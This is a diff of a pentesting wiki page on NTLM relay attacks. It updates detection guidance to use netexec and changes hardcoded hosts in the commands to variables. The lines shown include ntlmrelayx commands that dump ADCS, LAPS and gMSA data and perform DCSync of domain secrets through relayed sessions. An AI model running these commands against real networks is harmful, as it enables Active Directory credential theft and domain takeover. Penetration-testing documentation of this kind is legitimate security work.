@@ -79,11 +79,11 @@ In short, EPA (Extended Protection for Authentication) can use one or both of th
 
 ### Detection
 
-From UNIX-like systems, [NetExec](https://github.com/Pennyw0rth/NetExec) (Python) and [LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan) (Python) can be used to identify [signing](relay.md#session-signing) and [channel binding](relay.md#epa-extended-protection-for-authentication) requirements for SMB, LDAP and LDAPS.
+From UNIX-like systems, [NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to identify [signing](relay.md#session-signing) and [channel binding](relay.md#epa-extended-protection-for-authentication) requirements for SMB, LDAP and LDAPS.
 
 ```bash
 netexec smb $target
-LdapRelayScan.py -u "user" -p "password" -dc-ip "DC_IP_address" -method BOTH
+netexec ldap $target
 ```
 
 ### Abuse
@@ -151,7 +151,7 @@ nc 127.0.0.1 11000
 The following command will run an enumeration of the Active Directory domain through the relayed authenticated session. The operation will create multiple `.html`, `.json` and `.grep` files. It will also gather lots of information regarding the domain users and groups, the computers, [ADCS](../adcs/), etc.
 
 ```bash
-ntlmrelayx -t "ldap://domaincontroller" --dump-adcs --dump-laps --dump-gmsa
+ntlmrelayx -t "ldap://$DC_HOST" --dump-adcs --dump-laps --dump-gmsa
 ```
 
 
@@ -215,10 +215,10 @@ A [DCSync](../credentials/dumping/dcsync.md) can also be operated with a relayed
 
 ```bash
 # target vulnerable to Zerologon, dump DC's secrets only
-ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER'
+ntlmrelayx.py -t dcsync://$DC_HOST
 
 # target vulnerable to Zerologon, dump Domain's secrets
-ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER' -auth-smb 'DOMAIN'/'LOW_PRIV_USER':'PASSWORD'
+ntlmrelayx.py -t dcsync://$DC_HOST -auth-smb "$DOMAIN/$USER:$PASSWORD"
 ```
 
 :::
@@ -243,16 +243,16 @@ The ntlmrelayx tool offers features making it a very valuable asset when pentest
 > 
 > ```bash
 > # User filter for SMB only (for now)
-> smb://DOMAIN\User@192.168.1.101
-> smb://User@192.168.1.101
+> smb://$DOMAIN\\$USER@$TARGET
+> smb://$USER@$TARGET
 > 
 > # Custom ports and paths can be specified
 > smb://target:port
 > http://target:port/somepath
 > 
 > # Domain name can be used instead of the IP address
-> ldaps://someserver.domain.lan
-> someserver.domain.lan
+> ldaps://$TARGET
+> $TARGET
 > ```
 
 > [!TIP]
